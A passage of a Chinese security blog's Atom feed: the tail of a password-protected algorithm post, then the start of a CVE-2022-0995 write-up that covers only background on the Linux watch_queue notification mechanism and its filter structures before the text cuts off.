3e7496dc2f9fc0fd8eb042ba9bb5d17473db9eda7eb233dc43e3304f3e55e455eff47a8be97b7874969b88a4475caf76e448f2cd0a9447bb7922182e7478ccb8b36dba8d36ef66cb24d83afcdd1809417e44bbd99a30f5a72bb9355ca2403c3df2114ccb2548dd45d3737f7fd0a14e5c1629184683bd8827e4c5edff36cde9c887e68b8cf8b2e43c69333f0cedf9b6d87214398c8b300baeea8a05b0f872c6282e44375eaf80f35fcab4a6212a259153b184abe05ba5a1782fb5e2219fd5fb32b04321f6e0ed926514260927f57b5084e98f557baaebc6a51efed708fa4a14c9b47caf0b0f211c86b983f8e2778fa9a086e18b8f1045fc6ee52acf877a7a93891d089ba09794b93fce58813b5c0cc56b490e45e3fdce330cee2685a79effe6cc11ecb83a5d413f4aa7989596404f0eef6a764a0137387916534fcc8fb999cbdee9bdb0adce7be533f47fded70e9eccca233533f2ab44ebe6913ada66d4b8b75094b5f7325367032a72272dd396939233659e2d04a2e76d9e891ba124ce12824295feee137e0b02e58b3090d2a821ce086c919f83d993ca3293b2808bccb3a6f6b6c5e960ec772fdcbe47cae031bebc0a558c5b25e0ffcbcbd2c6c007565389addf1edccca3d95127c85c745c9618386822edb9d236368291a3e530128b9f351c7d204575477c4e98d914322c07a7a5d431e4a8d0c6bba30c50f1f462f18094561901db61d116805c18e348eae3eda416d77f89109c7e2e67bccd494aaaf962d16cfdc86e3eaaac9684f9a44995cc969399a5fbe7628f93b46a328b751692bc77536a9b4d07decb6da6c0846a7445fea2833f1948fdb9f2b1a4860daa809e14f31bb5788b4bf568db67f244bfe214ea0f11497a2e3bdfbb195727e1af4b9422d81103f1bf25bc1c3dc46a6e016ad7b462e29958f1be15eaba8956de1cd202daa19505e9517ae0bc992bd9f6f4834c294e7185f282fe6133b09b9cb8810d32b183f3577873f0ded53dbb9335bc484cbb4cdb3a79b891db1ee0924bfb80629cff6c5b71c6eb3bd4069cd896cf6ec19200b45fd8f85f1b10c06b01b8d66a6bae82302166cd88ed5c8090bb148041c4cafedaaf637fabdde0459c71999d6efeb706b02e9f9787359b57964fca85d7eaaa532ac9cac71a4e5544893f97e11ab00e45009bdb52022170f3680d5eab9c84ef4ec44640c3e3e8ee5098f81a25d40e0663c04034f01c297048b9a00bb1f93ad92ff3a735ddf23f7cc7a4e8f1e1a275097287aa665e4c238a7e339b023d4ccf300aafff02fca993889c4ff2b5cc9049e7d49b8c9212ff141d2a518ee560af6baca3603724d29f348f1ec9a0005f0e60b88b7f3ba7398910f53c69aac8aca9967ce8cbb194f8527a78ef95632ccd395d831d1a985323146c3700694d8ae461fc9b09c57640522c631680e6cb4e7385d02ea1b5cce79cd337b29f7aabb1ef42819ef0750b0b47a646891e8a68c6d1a2a7d426fc2d286b8d4a81c7b87d8fb36afcc83f02e06e1914522fd15fa847fe8bfbe07e620ebebf5b725493826cc77ed15c90e988bf8b586d7ee301e2046e2386727c5f91ccd196d502d3888b19503dd060ca9ba126f53e18b69e21aa97a50459d04a08397417a3dc02c92976709ec3cd7197774482c948b766fb25a48c629a03db8b6aeb752cbbb492ac31238e419f09989dd49dcc435da50a0966a454567d8d518c7dfd954281974fdb9b8117b55c4e00a5b3ce1e036d4b5bb800568368718cb340053cf41f60a127207d60d224244c17921e59dbddffaa1fc0af4ae87c8df58544da5589940b382d68c96baec164b7c2479c0424253f37640f5f04300a29fc17fd526665c9310e7f8f8dae3e16ae7dada52c8b633be28fcf71ec9c46680f5015ce7228b9d9aad2721fed6614b0d2da40c9bdcfb04cbd766796e7be3f790a11d7ab41c3ef0c892ad69dafb4ecd2b2801ed0194aa80c896db1d2185d3dac7f39fcbe221f937eb4884c96b804372734dfc0c7d3f9c60f836325c12b956800633438283147f86dbecf2acf187556ea9a9dadb3228dba8363eb2ff02797357034e2a5789d632cac11399c0c92af0b63e83061ad4bd85bd96222021b950f848f00e59425165d0cb9e2838cfbb738d351e7fb4a7d8b57b8d2c4f6ebaa001b6bbfa260b7f89766afa80d87be57f67875ae3304274e624af1e9ec4e42addc1cdf15fb0d13ddeeb706e91ae72f0615fa4ed05410e29e4fa7b16b40f6da4140cf454ff203b67b9a3c867b32814b1b11504c98f042dbcc50cf8112536763994582d5cdcc5c05516a6515d20e948620e1866e6e9f5f28faebd77f8aac5ff12e762bfdd7b098ad5ad054e4c11ad42f3b014dfdcb940edba42033d908f4ad874bcc75101cb1b6bdfac7d7c7269632e1b4ddde5a82dfd3f2c7f062372ff90692ec2a16ffc32492d6b591d16517709a12ea368e7dd8919edc9c38664dc6b67e4115fcaaac8e2dd2709c1ce4a5d608bf7ca1bf5ac4e2d3ca20b9d6122cfafaba37bed32a136e74227ed19d6f8f9684ca740e6db6ca0ba8124b0e24915ce8c1ba396f9fc90b2f8b18c287ac9f1e3b90524d554e905e3587baad6bd234665217c986641a7523c3110f0942b7c0e9fae9601e1f8a51cbe6fcd90ff320a76f7e7fd2746d8fc5c7ad1e05df5efe0821698accee53c7afa608941660d8d1ba682ae969dab3cc515e7796c0c308dff17308ec18ccd1bafd681f32dbf6722a41be07e67d9b01dd087c8b411134408f2b175c4a91646f2860e05e615032e8c42bb46571fe022f16c5031ec665aade699c9e10bd9a4bdb2ab1eebd2a45973e8c089dcc349cd2e08b8f5b4423eeb8eac245430df472d0319b858dbe7499efdf850aa0e627a0a5301011e2c98b4bc1a0586866092309b0802ea12b85a924dc9342dd0ec66ccaede6288be478516094fb86033201ea7a306568a3cacdda7f19f413234793fea22194b8ba9cf706103e43bb901e2f9237b6654c8d9c91e9bf400966dd88b440eb977daef2b6b7db7027fc32508fdd5884b29faa29b2080ba1bc9acd657159c7f1cb155f45a21038adf75f6ed6d0057764ee96519584cab53861ac220ae0392ec6008ab3fb04f412b601e1a2760ab4a680ae3374d57051ae36add393c3143eacb6cbf288c5de364a9ca873c5f7e068508c6000da5b39bcaf2e8438a1bb447730f989b81bc5951181482af380109754a87b14acb7267d893c53b00555f8cb01167535df7b1beb36546bb0a11aaebe93d26ee47bc942fd9b1df1bd8c56a4fbc710f8e9b82f218cf883c5c9f4b70e0ffa1547ddab3a0f60ae66b4d1f5218f0dad04a66913d4d77dbf118eb7b4cfabaeac4829fd06f1f2751d9218f80afdd125fc7e391b080268187873e0e3f6c4d085f01a54b31a09868992a76cc7ac9e24f8006e192dbf7c7959fb669d0296f78f814bd6da8edbc826f8384bda125c7e6f949133aa6e107c2cd6913fead6e0cfdc7a5ff5c502284f419cc6f4dd7bfeee0deeb19e451722c7e946a9a78f5b22b306cae927883c4807f85a0a9cbd41d11633cecb6f2ad8e47514682e2194a110a97fcc0eaa2dfc263154d9ead3734dbf871b97e2fae05c6fc1e4894dc4a997605d35b1d94f17919cdc6310e56519fb3a15c5cc89e2231c02ea03a630e29628c6197ff7b752f3da20f7dd18d66a5c5d9df8545abe0eb2fe5982f8e1bf05f3f14fd3f2d783b3a4f33dd868a3e33b72a47e58e065971ff8d26becc946489a24bdf371f45452703c9bd6c00ce5fd5ac1cb243d87f060985c4b11693914c75e2b26cf7dd44cc92324f7185fdaac3d1a56778ca71a92bb8881d85aa4e8b3fcfdcacedc47c2d7983e36d76786de605a70944a1a017266d2235aa9ab4cb2bfb65576bd293d24927619abd42ee0a885880a3685583db7a595acf83ee81cd8459ec091475310c0258ceddbd6866d61dbb71cfc7536acdfe6b020a0404ddc63ce94f8edf10970d6ee20b0882412d22f4f0e1527c4fc8ceadcc2c0db85eafced033de983a7dcd3cc2f2386c234b0aa088eacb6b034a7da022c9167105c9b23135e2b8b4900f2c4c4edf6adecb0048b410e688933d4c54dc61c1a5cb9e4418f9dd33f8d78d592e44728fb015468274a422f79d6f1157239f61500b65afd377a3f655c8ca7d713c01d6abb6eaa1fd36c20202b89d25baec7b1bc16aee25908e8fd18281f1db17afd511a0209034fd32cc7f2a1aa6495a7f68b27d7b63df60686697af8f3c5263009a8f499e7833231f945c1ffdf51455068d6573e393346ea91c8e3598024ba59cff4087382409a08b3a287e3629b64b7407c67dd1917f8204eb768cf9b77ba094207db6880faade6096103cd13c539bf7462fbc8772bb3f8f87160db42523e1440f957fccd9ccd06004806de7d1a0e040968ea7570eb67c530bbf1f0c8f56e250939b13f68eb9766d02ee9998b710dd8684bafbe54973711c4d1a5ff2b99d7cad5d1b8ffd0a9e0d90cbfde1871a876c8939ea5f98e08bae73a7a820c6963c856bc3fba6d916eda5a0cbcacedd046d11dc68c68056b2104b327e5e04b74221d8835af9c35bfd98366a813301a52387194df5d17470f443fd04374c071c7a8185b02c7477ce54c029e408256d570e23a671fe88cf82225844e95ee9c94ab308447c36194032c1d36528d71460115404b59f9d1f44d7ee81aec4b10f6ecf56702b5ca1e0f5e13a4ae2bd9917044afb0b45881a2bf43bc85bcc78e4c8ef3cbee5d1ed56f810a5a7ed3bb1105ce4c492d1dfe31d8ffc77e7b20b03e307a92af240c5e5bc999cd40229e2a15de68382d2c629a8c4b846e983bb3ba3b57f1b9d749b122fb35ecb4afacf0b89f1efdd0196832c057178159921fb3dc61656ded99f1c19142e007d666e34f90ccd12607c29f774332c0cf596d536bc5d88453436dee7d07a72d06527e291eb75565f472feb5f52a1291e423289162cc7d1321ff222e8a0c14f9be157a40bc139c3a5ee74f6c670c583e3b4ffa28ffe243172f77b7aa931eb8b32d48659cfa304175dc639e92ecafb9296fad6f4686f0d4774db41eed797bd00b90f61559f9e10681f3a7e8b3382e23e2a7f19109504d53512eddc38892a3eb65741da868c69cb19156ec1c43a25883d52b2a74a1810addfde6a438d037a03736d9fbbaef425f37ec565869a08472c161bb8300bdc5f4d75fb644811c71bf5cf25047cede47399686db72e0fe8967e36a336b83c7197ef42131354ccd876ad9b0e99f5bb02aace1087b38bb6c3441ee4f3228805e3a6a73d6a221b4d54fa23b7a90a8a732d4f03a0c884b70303670ed91d2a34736310ba2b3d328742be634d093d1c6db7e3c9e4f9850fb260a0a1e59d626d2dc2fe912c7b26bb5528a56f9a61ee049c748116f79cd6733700d1864a88468576757f282ded3882043544b4cbea7bbe0cb1372241440484ddd605f3780defd275251d14d84c660c1fdf4db1b7470e795415005619a6a9e1000312e9873afdbc1bcffcbec524f973b0aa75588a984d2ee9ad6eec32674d9b71b2c0c748c017c4118e4c06ccb64e6b86d6af94ba3a74f4c76add280f67559e23606f2bae38653585d2f39f49d63297a16a9a8fcc1e1807eefbc52b99d687d18c1a57cc650926a0341b86dd2800e86d2b8cf47b69bc5451d3a697ed2bd1c1f2867c5a625fbf4951b62b24ef5b2c6997ae702c2b44d2ad70ce3186835d0c4ba9699fa5047b658893424f5238531a83b6241f0e8da891af26ed57c1cfd7b884cadfb1888a6f46945902df36e740d2c9b64a13e108c971cee7b801367f75324edfa97c8ba3561738bd6e74f389f009ca62079394684fca951e599f65a584d045af600d8bc4728c0d1ba8d3c76236bda3c8c129460d21cfbd2e12886bcfb8982f96c41466eb8c2c8d11b623a455e4822dc37598421c5fdf9c4a90916d05a2570a52b405791072d733ba960d4cf4597d9a35986f83903595f5baf5012dff9f2470f12cf7aa63fba2efd1357a5d7b941933f7d10485355c11c89c3779e947280370ee9b52736a5c0166d8fab8d432c8184a4e95c2745b3c49c313cb1eba7d516a2516db67b1ccd41a1d33e3ca1b67ac7fa20e64314664ded417af45847c88e79b0318aa155c2ebd15049ae54da0a55d5440ac4a9f512756074ab40b4614c97a46cf3fa49ad67991ea38abe0cc7fb68a50d1f26e69bb78621beba785cd5491dde94283f0576f5505e74a556267cebc798be87b2380786f2f814e156b9288d2452749367c96d3a2ceb1ad16b29513d5177bd39071b64a2209310b0beccd90769eafebf188dc1f8aeb93b5e3c8a80dcb4363505bec9e71622e44495e1cd48de0efed253adbdbb030932581c08bd365d07cdc7b00dca44a7e50d6883e98b08bab5d573de33e5af6ddd5bfe31afcddbd9778e2ef8bba4c463ede817f484d743b65e48bb70b0e69ce1c00948770edf4ecae5f4b899f7153825dd1e0b90549b8cb2602d93c944357926a81f6d5a9fe5cf1527e793c49bcf62db611114a6f57fb98825a6e7c3232e32882ad0864b83216b8f709ed85e649f52bef5a0a9bda658278bb8c95afbc61aaa7bebacf28a2fa6ba43dfb833b641443c995f482faf91579b8fa607c3c61270197bed73e78592005f74cd971da6c4e2ea88d8b93f0b64cbd063b9688551f9bce23f3bf4b44d7435dd0217c63aa89eebe4bf463b7cd7cd010d91022bcc4de6cfee0d6f85579143ab520982358253eee85055baa778d40f5946fa4713732f000f562e4243c4c0134de21d31a50b931a3eaf925f9c9a421d16023c322bcce2d521326d91ee7385d105ac1fbab8c3cc8f8582a94e17a99d05d7b9c36f0c2f03f2fb1e1505c2043c41f3738db77934e2a2a9f12553fd73af2504717770fb15f72768fc966e1b132ed8de95f9661fe39f102fe01785aafbe6e23b2fd5ba095be38758f6a6efbf81eaba6185ad243b545b0b7886b257bf39a334791e31995d4ecb57c1de07a5c8d046d9a000de3a9a5c6201d7a324fa0108fd6581ecd233024e82d4bb78620739ca2ea2aa37db8204d629598b0ff9ed18c033ceabf2affd60bcd8d5dff6d2538b7913ceaac68c6c69ac3bd1cf2ef9a39023ef6156c6282dc2803a68d15b3ed7cea92b4d024be3bfd4e637c14a34d0ba44b9226bab85a1967ed856648d2fea3ab8b73afeef329f97fc447a1420fa14f606ab55dbb2e719af02a1ca826d90e4072723e68d6979f33b4d253b777acaae4f8c15521557cb8d008fa3258a3a0fa35396b3b98783a7746333977178098e756db76108b550b25c17f2a7249d54b9b1c1cc0985d693d5c0b87a18b1e089732a1ffe3d505e74c5b702e0552ed3805ed15c8bb504e196ac5024436be3198b658375d77597a85efa8b3a167849e70422fda46e069f5301749c082454c66b378a5b363c1f980a90c32ddb52d848929aa2fb74c4d7bed0d8d6ced72d181d1be89e61a9aefdc260d900fd5e435b09804fc54c5f20d0d829f86652c855390a4d3bd164d47833af0371d256e056694ed492587403f818f16ed5e7dc594decaae9a54c87e75dc6fc74cc8d724ca1a18715b9629353e5bcfbe9c5c794a4cfcfcc897acdb96bbdbff01e552445587279d76b2eab53a4909178ab1decf293b479ca4965c21c6847fe06fc55ff6416a37932d271c121daedc3af24ad5debfadbd06dc90374c7915e9e9a2f63c0a6357f4152b92c81739569e9cfc9abe3721f39db1b65c7d5cde3fbcdd6f02616bfccc7dae54ae7d71b2258fb009a8735e28ef5b4490488029a6e054c960f7a5dcd91cc0a1d76726ac343668055bc100cb7336c4ab4803aef89105e7f59208bd2c50fb9ed93935dfe63c889a175c4a45eca224d089e3dd502c5649ec8015fe21677c005ac82eae3fffe1425cd20a2beb23e12f3d68aa2f4ae2d4bfd6d6acdf435975d597613e67c9c70464c52fab19122d509be824eb2b62ea132e74ba77295cd0b743c32e0ece12d218611aa886fb066249b45308db86596607632037f2798fbc38bb607fd9ced3fffce31d34a679777c84d3089a0223fdc8cbfe035e177b17bf58a03d08347334fbaa8ecea987ce5f8bad80a38fc2a93ee449edbbb1ed1f3f005e73a46bcc322eb60dad02836c4745fecb738378e13f26522c43fedb11e7e5a6acd17f1e125dcd7afdbbeccc8cc20408bda67429dc25f9dbb96c9b217a5c1958922caa9ddd6f5107a8e58ff90c50be07370e3fe0b6b9f5dc30d11dd50ff5dba167bed204877455bf9781368fc00c12a32e822b0fb4a8174ea223fd9ec32e9083ccaeb246f88e6cce12db8c854597d79042915d2204a52a24f69c381b3ff4ea7f0aa2a1dab9defe2c6bb8115752e40a9f4cbcb41bd665c9ec47d672fcdf985695d052108bbfa3aac435fa1cc68c7a473813c501399ba789bc06dd6197083cfb127673a09cd84d7cba821ecf78b0e22729841dcd6fb47ef2dbdc3f3c29dffd4b9ea2cbfaaac9376349d613d4cd20d2e0e0ca2f287b5e31fa22bcf4a63f0107e1675310b16c94456233342eb33987b36debe87f139aa05918ea0fc3c481479cc2685b305154d88c78ed3b0bfeb21256ed60d425372ee86b8d7863d246e8f7a3d694c83a1d10d9943555f1d079647e959d847dec820b49ccacc2f3088aef3de6d08496ad4c91954f226a781db9d1066222722fb01ca3b694cd8e9b6e57bbaf6fa06b76dc07499622532de9e883fa9cb61b13bdf67f1722f6cd28ac8b77bbc679a747aee57934cd266e52c08b103e42a53f2f2173965f04d9a7c099d7f10e3d5fc5c33d4ff207cdb19c234443676897e714a71faf6f4239bacee6d330d054b7d6a437cfef87595652c59a41be848722c49427a8b3009e9de8556a47bb210a8c603bcc921eb09e1bccdd5e43ee75f1074e0d6ace6452da6692e3d9f6da8be969d1f7ae1d755dac1bec3db93f0864848c332437132c64e0d054afbe4cc612ed242947775cae64fa21e15a0b8dbaf018c6c2f266bef10d83cd3a7544ecc2c6d50aaa3bb3bc799d682fd1a1eb0bd2eb43e966584291cea29812805805679a2dfb6a1976b7389f8234c28e225a51246f6fb711a2778b6866156ee61ff0bcb546f599c6ca6732d543640420cb2fe34be2664dfc30c520d861a7d6d66b98eadfa5dc4d1d178ec00fa74b520ebd4002f325a8f015eee98b5ad48cfc3878fd71472ec5264268800521fb580e14db5ae0df7759497a4299454a5a5228d1d6277d5fc0c81ac78c18ce342d21d5278c378eb91ee109edc97430e68020b3faacac2545248b65825df63dec0b9f898f0b82bcaa5b20350b85c3d0da217ec37e1cf623b77da7a75ee93c46e023deb8fa0ec8d32d7e8c2c015ee164e09ecbc7a84608d7426ac3308015cb096664ce1703d2faaaa4e375230853ec7384355f25676497e4294bd216f26750112db4f3dad96639941008e3066cffc3c7711b5dc935c1975c5a3aff36aefd9b112218dcdd17187108b1c6aa2499e1d1b5f5958a0ca60bd7c6cfb1f756d8641f570ff31abfd568507421d0c02cf623af0cd8d841a2e9a302e35c4d1cc3d22bc7465b70916f69c90bd2f8f0dabd4ec7757aad32c7806714c25ed32c10e81c5dea456069bf053db029e93b5b18e09cef7bff8bcd7ff02d272727b02c8818793ae19069bf7ef34a63b312083011c46a69eeba371e0a9309a78869b3a98002538ae9c39be8ca173678c1d691bd783e8a7313ec211c05b8db2bf9c20d719c0fa2a6ae48ce14deca7f7c052432b653d6cc32e655d612d38c66cf90eb74010b5d387bb2f943a1fe497d19495114182c128afffb1ae3898a7f2defa961d341aa92acf989f41a39b2901e713863fee607a80edb9001dfdebdc3af187519df33a027935e7335018ac37da2c2809daa3c8a4e32a2944fe30ed248ecf6014e88a7db58f09b02c722a136386da926eab17bbcf56a48be07b5891b6b9f900760c3916ffb1252a8130fc91958a6f2a6a229e53a75e459d478c1a8d7eeec3f8cb8a65eb9bee3f593fa082ed2554a85164ab56abe5becc68bf89a3dd367803e7aba0fe1f1053f1c4e338b04a15f7bb64011cc8a380bed98d415a17e6e732bed8872f85906feb5c2d4394189a7195ba0231ed3ef8695420b33fe83ec567f15adbfc4ad95bcd66a48d93ecc9860443824916c55a6bc809b62e1f4d986cae85c6faa290fc3a54be8028df1a4f59caa20e418ac7faa23fa15e9924177e231656b682057743dd74454a8467580686a13f450d7f9609fff564662d16ec18bcea9ec087a3700a3a4f67d5206899e0bcb20971378cccc864c175090974b0fbe4ab33fe12959f3ce2cb8c1a419803f9346e0d24444a2c35f595193a696911e7140540024f07b109139628cac0672aac0cc9a4b3bd4b64857dabcf0e52b579a0735b8e46a7aa0adc735487e1104bbfdd73b951f52ff0ce35e5f9e5ae770d14e0ffcd357ecd78c6932a0ad513bd6126c9b49996340eb0376da88a4561b3388f8821b73fa95f9f5be2bc5c42ab4ed9cf23c19800b09d74d8df9435828b9039ab7b9880b53bd31a38cefcdc2cd7bdabea9326ba9ca0457937c0dc61a7f69d9c20808ab4e86b403fa194e0f3eafdbcc2c3f088a676e1363b4a9409c5e58cb83314863487e5633ac3f22714c451af6cecf21d819d598baee74c9e13bbbedb50ea972f2435aa5169912ecf0332624a9df6a94688aade9ffc3239cb27f2c935473b6e51d954cce341b0788f76e29f3e268b4c7d9e60545e710c7224b27e4e5eb5d079e0dac35aa5135f88a58d10edf80575fc47ee1ae7ce264088f62f5e794e0cf82e48ec23b77f9f4faa80c3cc1ca70d7729b25f9d57b1d98d228e75027e1a1abbe2445a075d056682e06e6aeb1f0c45cb50b4b40d07128009a84559395d2720d0b8b5fde86fe9afec0dac5d073049d0d215b6f789680e6ede7ef652f8826a48bc6a0358fbb1283048509186d7e4a73c0983295d60a15bfebcf0717abc22f4721d9eff870509681a993a7264a8e5a7dd3f30ec432aba761609f441ee8a1f76df75fb262f5904c74d20548651e9b981cade96e4568449fc014598fa6e14829b481f3ba73c3a92044b816315372fad51d496b015a4af83e9e84ce41e83bb83103b2a121e540884367070cf9e2e1928bac3432f5eb4bd1cac115e20481f913e7f5c8340d5644aab3a3755d9d8bd0256bc8760d4d90a97decca5324ee1a6ed71d8adca23ee1b66bf6eac6f3cdfc456632421836004668c392769382480bbd225ab1d89df3a8425a09b47826a7178246c91e63f52ee544215c07a24635a9b3e12353351b6a30f378dd8d565065b1159b9f0128f759cfc309209b0533434a3cfdd86c7e7289b493b2ca76e8b141c991ab9b27f9d78137f08b2fb3abbe432224768d8d9c5faab2497b9c29adb38fb9d48ed15d6b84e81aa82fe815e36e56b425ca12ce22f5e035723555d2ed285c234712852ae3e885d458bf01d6e2efaeb9e36a27d2333eda3dfbf8213ac41514afdfb5a53330b731700cd0e68c3137dbd1010d8dd1921f27e77603a6dfa74f88d5cd454b2579e070e7865b051e11b5d12199eec578e4fe8b6a37104a49396ceb07a4a0dace7217ae88cd3ee9cc25858b8eef7f54f23f411a673a6f26c81b821dc02821ed702f26ed2af4b534437f1afcb9dc639c5f21ef6d5e5d4bf70cc3b3b477acbadacff3d98ba649d6eb9bd82ba8c45d2c1b8ac9dcc7445365363d728fa6af17b45ab62dde44fc20bff9791d639d96d5c425c84846a640b4fb09f6c5ce61ee1e842186924dd650098d743fdbc7a70605f65c1c68350cf8f36510f29fb926835454f0950510b97900a5a48372369a4fa1fe6bc81923394e237e0c10c2c501352a6afc8d661c0bb1922550ed598f7bef7a69f067061100c535785c7e2c1404f2f64feb0db030f883c5da6922843aa661db39851ff8a03691f4c5b5050cd1830210c111fad52454696857ba0aaff7fddf04a2608fd3929775718eb4ce189e637e0983369d87fd5153545240db47297b8a52f86b68869a992404557c7684b62901af875f78303e43322a0a80dc9f47de7a20efdf8f05d43086bf429f0a6c5c84ab871ce95663e3cdfd29921fa5ecb16034300ba684be50aa276e1a2a726e19ee3a6ab9ec32d96922aa6865f0aa1fea5d09f27ab978266089403291ea456562abed9355343a20378bb38c1bb786974ac0e79b1d50ba2ea4f1e1e6a5617f1d56242a022cfbd6a0e24dd2b2bc359cf3b136fe421dff7213fc12a19305ee64600fd2f946420fc22a767cda0bbd5d8636ae5dce2202b51da840e97a90242886d03b237a8eeff63e0638f8e35700cbb81d2736402ad35404e722a2d72348bcfca8b1e47458576fa448e15d64a7de597b9ff855decba5db53ba0e0fb86b89630f196617d07f6ec0cd3ba6fa1cf704fb6f0160cb846b4ceb7ad25a59f1ece62a63c3a275c4c6c432e96a4e6105243b5cf06a76a25fccb095ab1332e793cfe5ee5969f3fc</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">面试官：听说你算法还行，来给👴简单手写个红黑树就让你过了</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">面试官：听说你算法还行，来给👴简单手写个红黑树就让你过了</summary>
    
    
    
    <category term="ALGORITHM" scheme="http://blog.arttnba3.cn/categories/ALGORITHM/"/>
    
    
    <category term="C&amp;C++" scheme="http://blog.arttnba3.cn/tags/C-C/"/>
    
    <category term="Algorithm" scheme="http://blog.arttnba3.cn/tags/Algorithm/"/>
    
    <category term="Tree" scheme="http://blog.arttnba3.cn/tags/Tree/"/>
    
    <category term="Binary Search Tree" scheme="http://blog.arttnba3.cn/tags/Binary-Search-Tree/"/>
    
    <category term="AVL Tree" scheme="http://blog.arttnba3.cn/tags/AVL-Tree/"/>
    
    <category term="Red-Black Tree" scheme="http://blog.arttnba3.cn/tags/Red-Black-Tree/"/>
    
  </entry>
  
  <entry>
    <title>【CVE.0x08】CVE-2022-0995 漏洞复现及简要分析</title>
    <link href="http://blog.arttnba3.cn/2022/04/06/CVE-0X08-CVE-2022-0995/"/>
    <id>http://blog.arttnba3.cn/2022/04/06/CVE-0X08-CVE-2022-0995/</id>
    <published>2022-04-06T04:24:09.000Z</published>
    <updated>2022-04-06T04:40:16.000Z</updated>
    
    <content type="html"><![CDATA[<p>我在看着你👁_👁</p><span id="more"></span><h1>0x00.一切开始之前</h1><p>CVE-2022-0995 是近日爆出来的一个存在于 <em>观察队列事件通知子系统</em>（watch_queue event notification subsystem）中的一个堆溢出漏洞，该漏洞自内核版本 <code>5.8</code> 中伴随着 watch queue subsystem 引入，在 <code>5.17-rc7</code> 版本中被修复</p><p>不过虽然获得了 <code>7.1</code> 的 CVSS 评分，但这个漏洞似乎并没有什么热度，不过在笔者看来这仍然是一个品相不错的漏洞</p><p>在开始之前我们先来补充一些基础知识</p><h2 id="General-notification-mechanism"><em>General notification mechanism</em></h2><blockquote><p>参见<a href="https://www.kernel.org/doc/html/latest/watch_queue.html">https://www.kernel.org/doc/html/latest/watch_queue.html</a></p></blockquote><p><em>通用通知机制</em> 是建立在标准管道驱动之上的，其可以有效地将来自内核的通知消息拼接到用户打开的管道中，我们可以通过 <code>CONFIG_WATCH_QUEUE</code> 编译选项启用（默认开启）</p><p>该机制通过一个以特殊模式打开的管道实现，内核生成的消息被保存到管道内部的循环环形缓冲区中（<code>pipe_buffer</code> 队列），通过 <code>read()</code> 进行读取，由于在某些情况下我们可能想要将添加的内容还原到环上，因此在此类管道上禁用了 splice 以及类似功能（因为这可能导致其与通知消息交织在一起）</p><p>管道的所有者应当告诉内核哪些资源其想要通过该管道进行观察，只有连接到该管道上的资源才会往里边插入消息，需要注意的是一个资源可能会与多个管道绑定并同时将消息插入所有管道</p><p>若环中没有可用的插槽或可用的预分配的 message buffer（一个管道默认只有 16 个 <code>pipe_buffer</code> ——对应 16 张内存页），则消息将会被丢弃，在这两种情况下，<code>read()</code> 将在读取当前缓冲区的最后一条消息后将 <code>WATCH_META_LOSS_NOTIFICATION</code> 插入输出缓冲区</p><h3 id="Watch-Queue（Notification-Output）API">Watch Queue（Notification Output）API</h3><p>一个 <em>观测队列</em> （watch queue）是由一个应用分配的用以记录通知的缓冲区，其工作原理完全隐藏在管道设备驱动中，但有必要获得一个对其的引用以设置一个观测，可以通过以下 API 进行管理：</p><ul><li><p><code>struct watch_queue *get_watch_queue(int fd);</code></p><p>由于观测队列在内核中通过实现缓冲区的管道的文件描述符表示，用户空间必须通过系统调用传递该文件描述符，这可以用于从系统调用中查找指向观测队列的不透明指针</p></li><li><p><code>void put_watch_queue(struct watch_queue *wqueue);</code></p><p>该函数用以丢弃从 <code>get_watch_queue()</code> 获得的引用</p></li></ul><h3 id="Event-Filter">Event Filter</h3><p>当一个观测队列被创建后，我们可以应用一组 <em>过滤器</em> （filters）以限制接收的事件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_notification_filter</span> <span class="hljs-title">filter</span> =</span> &#123;<br>        ...<br>&#125;;<br>ioctl(fd, IOC_WATCH_QUEUE_SET_FILTER, &amp;filter)<br></code></pre></td></tr></table></figure><p>其中 filter 应为一个 <code>struct watch_notification_filter</code> 类型变量，其中 <code>nr_filters</code> 表示 <code>filters[]</code> 数组中过滤器的数量，而 <code>__reserved</code> 应为 0：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_notification_filter</span> &#123;</span><br>        __u32   nr_filters;<br>        __u32   __reserved;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_notification_type_filter</span> <span class="hljs-title">filters</span>[];</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><code>filters[]</code> 为一个 <code>watch_notification_type_filter</code> 类型的结构体数组，该结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_notification_type_filter</span> &#123;</span><br>        __u32   type;<br>        __u32   info_filter;<br>        __u32   info_mask;<br>        __u32   subtype_filter[<span class="hljs-number">8</span>];<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><p><code>type</code> 为要过滤的事件类型，应当为类似 <code>WATCH_TYPE_KEY_NOTIFY</code> 的值</p></li><li><p><code>info_filter</code> 与 <code>info_mask</code> 充当通知记录的信息字段的过滤器，仅在以下情况才将通知写入缓冲区：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">(watch.info &amp; info_mask) == info_filter<br></code></pre></td></tr></table></figure><p>例如，这可以用于忽略不在一个挂载树上的观测点的事件</p></li><li><p><code>subtype_filter</code> 为一个指示我们感兴趣的子类型的 bitmask，<code>subtype_filter[0]</code> 的 0 位对应子类型 0，1 位对应子类型 1，以此类推</p></li></ul><p>若 ioctl() 的参数为 NULL，则过滤器将被移除，我们将接收到所有来自观测源的事件</p><h2 id="内核中-watch-queue-subsystem-中-Event-Filter-的实现">内核中 watch queue 